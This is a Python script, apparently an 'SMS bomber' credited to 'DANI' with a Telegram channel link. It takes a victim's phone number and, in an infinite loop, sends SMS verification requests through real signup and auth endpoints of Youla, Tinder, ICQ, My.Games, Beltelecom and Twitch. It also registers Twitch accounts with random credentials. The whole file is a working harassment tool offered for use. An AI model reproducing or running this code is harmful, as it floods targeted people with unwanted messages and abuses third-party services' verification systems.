import requests, random
from time import sleep
import urllib.request
import colorama
import os
import webbrowser,pyfiglet
from sys import stdout
from time import sleep
os.system("clear")
black = f"""\033[1;33m[\033[1;36m ✷‿✷  \033[1;33m]\033[1;36m HELLO IN MY TOOL"""        
for char in black:
         stdout.write(char)
         stdout.flush()
         sleep(0.001/0.02)    
print("")
print("")   
zombie = f"""\033[1;33m[\033[1;36m ✷‿✷  \033[1;33m]\033[1;32m THIS IS MY CHANNEL »»» : https://t.me/D_gorjipoor"""    
for char in zombie:
         stdout.write(char)
         stdout.flush()
         sleep(0.001/0.02)               

print('')
def banner():
    print ('\033[1;31m          ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇         ')
    print('\033[1;31m          ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
    print ('\033[1;31m          ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
    print ('\033[1;31m          ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
    print ('\033[1;31m          ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇   \033[1;33m  CODE BY »»»» : \033[1;34mDANI')
    print ('\033[1;31m          ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
    print ('\033[1;31m          ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
    print ('\033[1;31m          ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
print("")
banner()
print("")

colors=['\033[1;32m']

_phone = input('\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m] \033[1;35mENTER NUMBER »»» : \033[1;34m')
_name = ''

for x in range(12):
	_name = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	password = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	username = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))

_phone9 = _phone[1:]

num = _phone
numplus = '+' + num
print(random.choice(colors))
while True:
    try:
        p=(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;31msend to",_phone,p)
    except:
        print("error")
    try:
        t=(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;32msend to",_phone ,t)
    except:
        print("error")
    try:
        i=(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;33msend to",_phone ,i)
    except:
        print("error")
    try:
        bla=(requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone}))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;34msend to",_phone ,bla)
    except:
        print("error")
    try:
        bk=(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;35msend to",_phone ,bk)
    except:
        print("error")
    try:
        g=(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;36msend to",_phone,g)
    except:
        print("error")
    try:
        dead=(requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;37msend to",_phone ,dead)
    except:
        print("error")
    try:
        k=(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}))
        print("\033[1;33m[\033[1;36m ◕‿◕ \033[1;33m]","\033[1;30msend to",_phone,k)
    except:
        print("error")
    print(random.choice(colors))